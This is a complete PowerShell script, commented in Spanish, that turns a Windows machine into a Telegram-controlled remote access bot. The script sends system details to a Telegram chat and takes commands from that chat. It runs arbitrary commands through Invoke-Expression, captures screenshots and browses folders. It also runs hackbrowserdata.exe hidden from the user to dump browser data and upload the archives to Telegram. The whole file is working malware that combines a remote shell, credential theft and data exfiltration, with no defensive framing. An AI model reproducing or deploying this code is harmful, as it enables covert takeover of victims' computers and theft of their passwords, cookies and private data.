param(
    [Parameter(Mandatory=$true)]
    [string]$Token,
    
    [Parameter(Mandatory=$true)] 
    [string]$ChatId
)

$ErrorActionPreference = 'Continue'
$ApiUrl = "https://api.telegram.org/bot$Token"
$LogFile = Join-Path $env:APPDATA 'CarpetaDos\bot.log'
$HackPath = Join-Path $env:APPDATA 'CarpetaDos\hackbrowserdata.exe'

New-Item -ItemType Directory -Path (Split-Path $LogFile) -Force -ErrorAction SilentlyContinue | Out-Null

function Write-Log {
    param([string]$Message)
    $line = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Message"
    Add-Content -Path $LogFile -Value $line -ErrorAction SilentlyContinue
    Write-Host $line
}

# Desactivar webhook primero (IMPORTANTE para evitar error 409)
try {
    Invoke-RestMethod -Uri "$ApiUrl/deleteWebhook?drop_pending_updates=true" -Method Post | Out-Null
    Write-Log "Webhook desactivado correctamente"
    Start-Sleep -Seconds 2
} catch {
    Write-Log "No se pudo desactivar webhook: $($_.Exception.Message)"
}

Add-Type -AssemblyName System.Windows.Forms, System.Drawing, System.Net.Http

# Usar HttpClient para enviar archivos (compatible con PowerShell 5.1)
$httpClient = New-Object System.Net.Http.HttpClient

function Send-Message {
    param([string]$Text, [string]$ChatIdOverride = $ChatId)
    try {
        # Telegram limita a 4096 caracteres
        if ($Text.Length -gt 4000) {
            $Text = $Text.Substring(0, 4000) + "`n...(mensaje truncado, usa /cmd para ver completo)"
        }
        
        # Escapar caracteres problemáticos para JSON
        $Text = $Text -replace '\\', '\\' -replace '"', '\"' -replace "`n", '\n' -replace "`r", '\r' -replace "`t", '\t'
        
        $json = "{`"chat_id`":`"$ChatIdOverride`",`"text`":`"$Text`"}"
        $content = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
        $response = $httpClient.PostAsync("$ApiUrl/sendMessage", $content).Result
        return $response.IsSuccessStatusCode
    } catch {
        Write-Log "Error enviando mensaje: $($_.Exception.Message)"
        return $false
    }
}

function Send-File {
    param([string]$Path, [string]$Caption="", [string]$ChatIdOverride = $ChatId)
    try {
        if (-not (Test-Path $Path)) { 
            Write-Log "Archivo no existe: $Path"
            return $false 
        }
        
        $fileInfo = Get-Item $Path
        if ($fileInfo.Length -gt 49MB) {
            Write-Log "Archivo demasiado grande: $($fileInfo.Length) bytes"
            Send-Message -Text "Archivo demasiado grande para enviar: $($fileInfo.Name)" -ChatIdOverride $ChatIdOverride
            return $false
        }
        
        # Crear multipart form manualmente para PowerShell 5.1
        $boundary = [System.Guid]::NewGuid().ToString()
        $header = "--$boundary`r`nContent-Disposition: form-data; name=`"chat_id`"`r`n`r`n$ChatIdOverride`r`n"
        
        if ($Caption) {
            $header += "--$boundary`r`nContent-Disposition: form-data; name=`"caption`"`r`n`r`n$Caption`r`n"
        }
        
        $fileHeader = "--$boundary`r`nContent-Disposition: form-data; name=`"document`"; filename=`"$($fileInfo.Name)`"`r`nContent-Type: application/octet-stream`r`n`r`n"
        $footer = "`r`n--$boundary--`r`n"
        
        $fileBytes = [System.IO.File]::ReadAllBytes($Path)
        $headerBytes = [System.Text.Encoding]::UTF8.GetBytes($header)
        $fileHeaderBytes = [System.Text.Encoding]::UTF8.GetBytes($fileHeader)
        $footerBytes = [System.Text.Encoding]::UTF8.GetBytes($footer)
        
        $contentBytes = New-Object byte[] ($headerBytes.Length + $fileHeaderBytes.Length + $fileBytes.Length + $footerBytes.Length)
        [System.Buffer]::BlockCopy($headerBytes, 0, $contentBytes, 0, $headerBytes.Length)
        [System.Buffer]::BlockCopy($fileHeaderBytes, 0, $contentBytes, $headerBytes.Length, $fileHeaderBytes.Length)
        [System.Buffer]::BlockCopy($fileBytes, 0, $contentBytes, ($headerBytes.Length + $fileHeaderBytes.Length), $fileBytes.Length)
        [System.Buffer]::BlockCopy($footerBytes, 0, $contentBytes, ($headerBytes.Length + $fileHeaderBytes.Length + $fileBytes.Length), $footerBytes.Length)
        
        $content = New-Object System.Net.Http.ByteArrayContent($contentBytes)
        $content.Headers.ContentType = New-Object System.Net.Http.Headers.MediaTypeHeaderValue("multipart/form-data")
        $content.Headers.ContentType.Parameters.Add((New-Object System.Net.Http.Headers.NameValueHeaderValue("boundary", $boundary)))
        
        $response = $httpClient.PostAsync("$ApiUrl/sendDocument", $content).Result
        $content.Dispose()
        
        if (-not $response.IsSuccessStatusCode) {
            $errorContent = $response.Content.ReadAsStringAsync().Result
            Write-Log "Error enviando archivo: $($response.StatusCode) - $errorContent"
            return $false
        }
        return $true
    } catch {
        Write-Log "Error enviando archivo: $($_.Exception.Message)"
        return $false
    }
}

function Get-Info {
    try {
        $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip
    } catch { $ip = "Desconocida" }
    return "PC: $env:COMPUTERNAME | Usuario: $env:USERNAME | IP: $ip"
}

function Take-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bitmap = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
        
        $path = Join-Path $env:TEMP "screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
        $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose()
        $bitmap.Dispose()
        
        $result = Send-File -Path $path -Caption "Screenshot $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        Remove-Item $path -Force -ErrorAction SilentlyContinue
        return $result
    } catch {
        Write-Log "Error screenshot: $($_.Exception.Message)"
        return $false
    }
}

function Run-Steal {
    param([string]$TargetChatId = $ChatId)
    
    Write-Log "Iniciando extraccion..."
    Send-Message -Text "Extrayendo datos de navegadores..." -ChatIdOverride $TargetChatId
    
    if (-not (Test-Path $HackPath)) {
        Send-Message -Text "Error: No se encuentra hackbrowserdata.exe" -ChatIdOverride $TargetChatId
        return
    }
    
    $outputDir = Join-Path $env:TEMP "browser_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
    New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
    
    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $HackPath
        $psi.Arguments = "dump -d `"$outputDir`" -f json --zip"
        $psi.WorkingDirectory = $outputDir
        $psi.CreateNoWindow = $true
        $psi.WindowStyle = 'Hidden'
        $psi.UseShellExecute = $false
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        
        $proc = [System.Diagnostics.Process]::Start($psi)
        $proc.WaitForExit(180000)  # 3 minutos timeout
        
        if (-not $proc.HasExited) {
            $proc.Kill()
            Send-Message -Text "Timeout esperando extraccion" -ChatIdOverride $TargetChatId
            return
        }
        
        $stdout = $proc.StandardOutput.ReadToEnd()
        $stderr = $proc.StandardError.ReadToEnd()
        Write-Log "HackBrowserData exit code: $($proc.ExitCode)"
        if ($stderr) { Write-Log "Stderr: $stderr" }
        
        # Buscar ZIP generado
        $zipFile = Get-ChildItem -Path $outputDir -Filter "*.zip" | Select-Object -First 1
        
        if ($zipFile) {
            Write-Log "Enviando ZIP: $($zipFile.Name) ($([math]::Round($zipFile.Length/1MB, 2)) MB)"
            if (Send-File -Path $zipFile.FullName -Caption "Datos extraidos - $($zipFile.Name)" -ChatIdOverride $TargetChatId) {
                Send-Message -Text "Extraccion completada y enviada." -ChatIdOverride $TargetChatId
            } else {
                Send-Message -Text "Error enviando el archivo ZIP." -ChatIdOverride $TargetChatId
            }
        } else {
            # Si no hay ZIP, buscar JSONs
            $jsonFiles = Get-ChildItem -Path $outputDir -Filter "*.json" -Recurse
            if ($jsonFiles) {
                $sent = 0
                foreach ($json in $jsonFiles) {
                    if ($json.Length -lt 49MB) {
                        if (Send-File -Path $json.FullName -Caption $json.Name -ChatIdOverride $TargetChatId) {
                            $sent++
                        }
                        Start-Sleep -Milliseconds 500
                    }
                }
                Send-Message -Text "Enviados $sent archivos JSON." -ChatIdOverride $TargetChatId
            } else {
                Send-Message -Text "No se generaron archivos de datos." -ChatIdOverride $TargetChatId
            }
        }
        
        Remove-Item -Path $outputDir -Recurse -Force -ErrorAction SilentlyContinue
        
    } catch {
        Write-Log "Error en Run-Steal: $($_.Exception.Message)"
        Send-Message -Text "Error: $($_.Exception.Message)" -ChatIdOverride $TargetChatId
    }
}

function Execute-Command {
    param([string]$Command, [string]$TargetChatId = $ChatId)
    
    Write-Log "Ejecutando: $Command"
    
    try {
        # Crear archivo temporal para la salida
        $tempFile = Join-Path $env:TEMP "cmd_output_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
        
        # Ejecutar comando y guardar en archivo
        $output = Invoke-Expression $Command 2>&1 | Out-String
        
        # Guardar en archivo con info del comando
        $content = "Comando ejecutado: $Command`nFecha: $(Get-Date)`n$('='*50)`n`n$output"
        [System.IO.File]::WriteAllText($tempFile, $content)
        
        # Enviar como archivo
        if (Send-File -Path $tempFile -Caption "Salida de: $Command" -ChatIdOverride $TargetChatId) {
            # Enviar resumen corto tambien
            $summary = if ($output.Length -gt 200) { $output.Substring(0, 200) + "..." } else { $output }
            Send-Message -Text "Comando ejecutado.`nResumen:`n$summary" -ChatIdOverride $TargetChatId
        }
        
        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        
    } catch {
        $errorMsg = "Error ejecutando comando: $($_.Exception.Message)"
        Write-Log $errorMsg
        Send-Message -Text $errorMsg -ChatIdOverride $TargetChatId
    }
}

function Process-Command {
    param([string]$Text, [string]$FromChatId)
    
    Write-Log "Procesando: '$Text'"
    $cmd = $Text.Trim()
    $cmdLower = $cmd.ToLower()
    
    # Extraer comando base y argumentos
    if ($cmdLower -match '^(/[a-z]+)\s*(.*)') {
        $baseCmd = $Matches[1]
        $args = $Matches[2]
    } elseif ($cmdLower -match '^([a-z]+)\s*(.*)') {
        $baseCmd = $Matches[1]
        $args = $Matches[2]
    } else {
        $baseCmd = $cmdLower
        $args = ""
    }
    
    switch ($baseCmd) {
        { $_ -in '/ls', 'ls' } {
            try {
                $items = Get-ChildItem | Select-Object Mode, LastWriteTime, Length, Name | Format-Table -AutoSize | Out-String
                Send-Message -Text "Directorio: $(Get-Location)`n`n$items"
            } catch {
                Send-Message -Text "Error: $($_.Exception.Message)"
            }
        }
        
        { $_ -in '/cmd', 'cmd' } {
            if ($args) {
                Execute-Command -Command $args
            } else {
                Send-Message -Text "Uso: /cmd <comando a ejecutar>"
            }
        }
        
        { $_ -in '/cd', 'cd' } {
            if ($args) {
                try {
                    Set-Location $args -ErrorAction Stop
                    Send-Message -Text "Directorio actual: $(Get-Location)"
                } catch {
                    Send-Message -Text "Error: No se pudo cambiar a '$args'"
                }
            } else {
                Send-Message -Text "Uso: /cd <ruta>"
            }
        }
        
        { $_ -in '/pwd', 'pwd' } {
            Send-Message -Text "Directorio actual: $(Get-Location)"
        }
        
        { $_ -in '/steal', 'steal' } {
            Run-Steal
        }
        
        { $_ -in '/captura', 'captura' } {
            Send-Message -Text "Capturando pantalla..."
            if (-not (Take-Screenshot)) {
                Send-Message -Text "Error al capturar pantalla"
            }
        }
        
        { $_ -in '/info', 'info' } {
            Send-Message -Text (Get-Info)
        }
        
        { $_ -in '/help', 'help' } {
            $help = @'
Comandos:
/ls - Listar archivos
/cmd <comando> - Ejecutar comando (resultado en .txt)
/cd <ruta> - Cambiar directorio  
/pwd - Directorio actual
/steal - Extraer datos navegadores
/captura - Screenshot
/info - Info del sistema
/help - Esta ayuda
'@
            Send-Message -Text $help
        }
        
        default {
            Write-Log "Comando desconocido: $baseCmd"
        }
    }
}

# Inicio
Write-Log "=== BOT INICIADO ==="
Write-Log "ChatId: $ChatId"

Send-Message -Text "Bot iniciado - $(Get-Info)"

$lastUpdateId = 0

while ($true) {
    try {
        $url = "$ApiUrl/getUpdates?offset=$($lastUpdateId + 1)&limit=10"
        $response = Invoke-RestMethod -Uri $url -TimeoutSec 60
        
        if ($response.ok -and $response.result.Count -gt 0) {
            foreach ($update in $response.result) {
                $lastUpdateId = $update.update_id
                $message = $update.message
                
                if ($null -eq $message -or $null -eq $message.text) { continue }
                
                $msgChatId = [string]$message.chat.id
                $msgText = $message.text
                
                if ($msgChatId -eq $ChatId) {
                    Process-Command -Text $msgText -FromChatId $msgChatId
                } else {
                    Write-Log "IGNORADO de chat: $msgChatId"
                }
            }
        }
    } catch {
        $errMsg = $_.Exception.Message
        if ($errMsg -notlike "*409*") {  # No loguear error 409 constantemente
            Write-Log "Error: $errMsg"
        }
        Start-Sleep -Seconds 3
    }
    
    Start-Sleep -Milliseconds 500
}
